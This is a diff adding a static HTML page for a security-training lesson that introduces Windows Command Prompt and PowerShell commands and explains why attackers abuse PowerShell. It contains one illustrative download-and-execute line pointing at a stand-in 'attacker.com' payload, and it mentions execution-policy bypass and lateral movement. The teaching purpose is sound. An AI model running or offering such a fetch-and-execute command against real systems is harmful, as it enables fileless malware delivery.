@@ -1,0 +1,124 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Windows Command Line Basics — Path 07 · KashSec Academy</title>
+<meta name="description" content="Path 03 built real command-line fluency for Linux — this lesson does the same for Windows' two command-line environments, since a huge share of Windows security investigation, administration, and (fro">
+<link rel="canonical" href="https://kashsec.vercel.app/#/lesson/07-windows-security/windows-command-line-basics">
+<link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'%3E%3Ctext y='.9em' font-size='90'%3E🛡%3C/text%3E%3C/svg%3E">
+<meta property="og:title" content="Windows Command Line Basics — Path 07 · KashSec Academy">
+<meta property="og:description" content="Path 03 built real command-line fluency for Linux — this lesson does the same for Windows' two command-line environments, since a huge share of Windows security investigation, administration, and (fro">
+<meta property="og:type" content="article">
+<meta property="og:url" content="https://kashsec.vercel.app/#/lesson/07-windows-security/windows-command-line-basics">
+<meta property="og:image" content="https://kashsec.vercel.app/og-image.png">
+<meta property="og:image:width" content="1200">
+<meta property="og:image:height" content="630">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="Windows Command Line Basics — Path 07 · KashSec Academy">
+<meta name="twitter:description" content="Path 03 built real command-line fluency for Linux — this lesson does the same for Windows' two command-line environments, since a huge share of Windows security investigation, administration, and (fro">
+<meta name="twitter:image" content="https://kashsec.vercel.app/og-image.png">
+<meta name="theme-color" content="#0A0E13">
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"LearningResource","name":"Windows Command Line Basics — Path 07 · KashSec Academy","description":"Path 03 built real command-line fluency for Linux — this lesson does the same for Windows' two command-line environments, since a huge share of Windows security investigation, administration, and (fro","url":"https://kashsec.vercel.app/#/lesson/07-windows-security/windows-command-line-basics","provider":{"@type":"Organization","name":"KashSec Academy","url":"https://kashsec.vercel.app"},"isAccessibleForFree":true,"learningResourceType":"Lesson"}
+</script>
+<style>
+:root{color-scheme:dark;--bg:#080A0F;--surface:#0F141E;--text:#EAEFF5;--muted:#94A3B2;--amber:#EFA43A;--teal:#5FE0CF;--border:rgba(255,255,255,.08)}
+html,body{margin:0;padding:0;background:var(--bg);color:var(--text);font-family:system-ui,-apple-system,Segoe UI,Roboto,sans-serif;line-height:1.6}
+main{max-width:760px;margin:0 auto;padding:1.5rem 1.2rem 3rem}
+.spa-notice{background:var(--surface);border:1px solid var(--border);border-radius:12px;padding:.9rem 1.1rem;margin-bottom:1.5rem;color:var(--muted);font-size:.88rem}
+.spa-notice a{color:var(--amber);text-decoration:none;font-weight:600}
+.crumb{color:var(--muted);font-size:.8rem;margin-bottom:.4rem}
+.crumb a{color:var(--teal);text-decoration:none}
+h1,h2,h3,h4{font-family:Inter,system-ui,sans-serif;color:var(--text)}
+h1{font-size:2rem;margin:.5rem 0 1rem}
+h2{font-size:1.4rem;margin:2rem 0 .8rem;padding-top:.6rem;border-top:1px solid var(--border)}
+a{color:var(--teal)}
+code{background:rgba(63,182,168,.13);color:var(--teal);padding:.1rem .35rem;border-radius:4px;font-family:ui-monospace,Menlo,Consolas,monospace;font-size:.9em}
+pre{background:#050810;border:1px solid var(--border);border-radius:10px;padding:1rem;overflow-x:auto}
+pre code{background:transparent;color:var(--text);padding:0}
+blockquote{border-left:3px solid var(--amber);margin:1rem 0;padding:.4rem 1rem;color:var(--muted);background:var(--surface);border-radius:6px}
+table{width:100%;border-collapse:collapse;margin:1rem 0}
+th,td{border:1px solid var(--border);padding:.5rem .7rem;text-align:left}
+th{background:var(--surface)}
+img{max-width:100%;height:auto}
+footer{color:var(--muted);font-size:.82rem;text-align:center;margin-top:3rem;padding-top:1.5rem;border-top:1px solid var(--border)}
+</style>
+</head>
+<body>
+<main>
+  <div class="spa-notice">📱 Loading the interactive KashSec app… If it doesn't switch automatically, <a href="https://kashsec.vercel.app/#/lesson/07-windows-security/windows-command-line-basics">continue here →</a></div>
+  <div class="crumb"><a href="/">KashSec Academy</a> · <a href="/">Path 07 — Windows Security Basics</a> · Windows Command Line Basics</div>
+  <article><h1>Windows Command Line Basics</h1>
+<p>Path 03 built real command-line fluency for Linux — this lesson does the same for Windows&#39; two command-line environments, since a huge share of Windows security investigation, administration, and (from the offense side) privilege escalation happens entirely through the command line rather than clicking through GUI menus.</p>
+<h2>Command Prompt (cmd) vs. PowerShell</h2>
+<p>Windows actually has two distinct command-line environments, and understanding both matters:</p>
+<ul>
+<li><strong>Command Prompt (<code>cmd</code>)</strong> — the older, simpler environment, largely preserved for legacy compatibility. Commands generally output plain text.</li>
+<li><strong>PowerShell</strong> — the modern, considerably more powerful environment, built around <strong>objects</strong> rather than plain text — command output is structured data you can filter, sort, and manipulate programmatically, much closer in spirit to how Python handles data structures (Path 04) than to traditional plain-text Unix piping.</li>
+</ul>
+<h2>Essential Command Prompt commands</h2>
+<pre><code class="language-cmd">dir                          :: list files in current directory (Linux&#39;s ls equivalent)
+cd C:\Users\yourname         :: change directory
+ipconfig /all                :: view network configuration (Linux&#39;s ifconfig/ip equivalent)
+tasklist                     :: list running processes (Linux&#39;s ps equivalent)
+netstat -ano                 :: view network connections (referenced in the security settings lesson)
+whoami /priv                 :: show current user&#39;s privileges (referenced directly in Path 16&#39;s Windows privesc lab)
+</code></pre>
+<h2>Essential PowerShell commands</h2>
+<p>PowerShell&#39;s commands (&quot;cmdlets&quot;) follow a consistent <code>Verb-Noun</code> naming pattern, making them genuinely more discoverable than traditional Unix commands once you learn the pattern:</p>
+<pre><code class="language-powershell">Get-Process                              # list running processes
+Get-Service                              # list Windows services (referenced in the fundamentals lesson)
+Get-LocalUser                            # list local user accounts
+Get-NetTCPConnection                     # view network connections, PowerShell-native
+Get-EventLog -LogName Security -Newest 20   # recent Security log entries, from the terminal
+</code></pre>
+<p>The real power emerges when chaining cmdlets with the pipe (<code>|</code>), exactly like Path 03&#39;s <code>grep</code>/<code>awk</code> pipelines — but operating on structured objects instead of plain text:</p>
+<pre><code class="language-powershell">Get-Process | Where-Object {$_.CPU -gt 100} | Sort-Object CPU -Descending
+</code></pre>
+<p>This finds every process using more than 100 CPU units and sorts by CPU usage descending — filtering and sorting structured data in a single readable line, without needing to parse plain-text output at all.</p>
+<h2>Why attackers (and defenders) both live in PowerShell</h2>
+<p>PowerShell&#39;s power is a genuine double-edged sword, directly connecting to Path 16&#39;s threat hunting lab discussion of &quot;living off the land&quot;: PowerShell comes pre-installed on every modern Windows system, can download and execute code directly from the internet, interact deeply with the OS, and — critically — is a completely legitimate, expected administrative tool, making PowerShell-based attacks genuinely harder to distinguish from normal admin activity than a dropped, unfamiliar executable would be.</p>
+<pre><code class="language-powershell"># A simplified illustration of the pattern flagged in Path 16&#39;s threat hunting lab:
+Invoke-WebRequest -Uri &quot;http://attacker.com/payload.ps1&quot; | Invoke-Expression
+</code></pre>
+<p>This single line downloads and immediately executes remote code, entirely &quot;fileless&quot; (Path 17&#39;s malware families lesson) — nothing ever touches disk as a traditional executable, evading detection approaches that only scan files.</p>
+<h2>PowerShell remoting — administration at a distance, and its risks</h2>
+<p>Beyond running commands locally, <strong>PowerShell Remoting</strong> (<code>Enter-PSSession</code>, <code>Invoke-Command</code>) lets an authenticated user execute commands on a <em>remote</em> Windows machine over the network, using the WS-Management protocol (WinRM) — the legitimate administrative backbone that lets IT teams manage hundreds of machines without physically touching each one. This exact capability is also precisely how an attacker who&#39;s obtained valid credentials performs <strong>lateral movement</strong> (Path 16&#39;s Active Directory lesson) between machines on a compromised network — <code>Invoke-Command -ComputerName target-pc -ScriptBlock { ... }</code> looks identical whether a legitimate administrator or an attacker with stolen credentials issued it, which is exactly why the Event ID 4648 (explicit-credential logon) and PowerShell script-block logging from this path&#39;s Event Viewer lesson matter so much for distinguishing the two after the fact. WinRM is disabled by default on workstations but commonly enabled on servers and in managed corporate environments — worth checking (<code>Get-Service WinRM</code>) as part of any security review, since an unnecessarily-enabled remoting service on a machine that doesn&#39;t need it is pure unused attack surface.</p>
+<p>Windows&#39; default <strong>execution policy</strong> restricts running unsigned PowerShell scripts, but this is explicitly a safety net against accidental execution, not a genuine security boundary — it can be bypassed in numerous well-documented ways (<code>-ExecutionPolicy Bypass</code>, among others), similar in spirit to how root/jailbreak detection (Path 13) raises the bar without being unbreakable. Never rely on execution policy alone as your only defense.</p>
+<p>Using PowerShell, write a single chained command that lists all currently running processes, filters to only those NOT running from <code>C:\Windows\System32\</code> (a common signal worth investigating further, since legitimate system processes overwhelmingly run from there), and sorts the result by process name. This is a genuinely useful, real triage technique.</p>
+<h2>Key terms</h2>
+<ul>
+<li><strong>Cmdlet</strong> — a PowerShell command, following the consistent <code>Verb-Noun</code> naming pattern.</li>
+<li><strong>Fileless execution</strong> — running malicious code without ever writing a traditional executable file to disk.</li>
+<li><strong>Execution policy</strong> — Windows&#39; PowerShell script-execution safety restriction, bypassable and not a genuine security boundary.</li>
+</ul>
+<h2>Recap</h2>
+<ul>
+<li>Command Prompt is the older, simpler, text-based environment; PowerShell is modern, object-based, and dramatically more powerful for both administration and investigation.</li>
+<li>PowerShell&#39;s legitimate ubiquity and power make it a favorite tool for both real administrators and attackers using &quot;living off the land&quot; techniques.</li>
+<li>Chaining PowerShell cmdlets with the pipe operates on structured objects, not just plain text — a genuinely different (and more powerful) model than traditional Unix piping.</li>
+<li>Execution policy is a safety net against accidents, not a real security control against a determined attacker.</li>
+</ul>
+<h3>References</h3>
+<ul>
+<li><a href="https://learn.microsoft.com/en-us/powershell/">Microsoft: PowerShell documentation</a> — the official, comprehensive reference.</li>
+<li><a href="https://attack.mitre.org/techniques/T1059/001/">MITRE ATT&amp;CK: PowerShell (T1059.001)</a> — real-world adversary use of PowerShell, cataloged in detail.</li>
+</ul>
+<p><strong>Next up →</strong> <a href="#/lesson/07-windows-security/securing-a-windows-machine">Securing a Windows Machine</a></p>
+</article>
+  <footer>© KashSec Academy · <a href="/">Interactive site</a> · <a href="/sitemap.xml">Sitemap</a></footer>
+</main>
+<script>
+// Redirect actual users into the SPA. Search-engine crawlers get to read
+// the content above before the redirect fires.
+(function(){
+  try {
+    var target = "https://kashsec.vercel.app/#/lesson/07-windows-security/windows-command-line-basics";
+    // Only redirect from the .html file, not from the SPA route itself.
+    if (location.pathname.endsWith('.html')) location.replace(target);
+  } catch (e) {}
+})();
+</script>
+</body>
+</html>
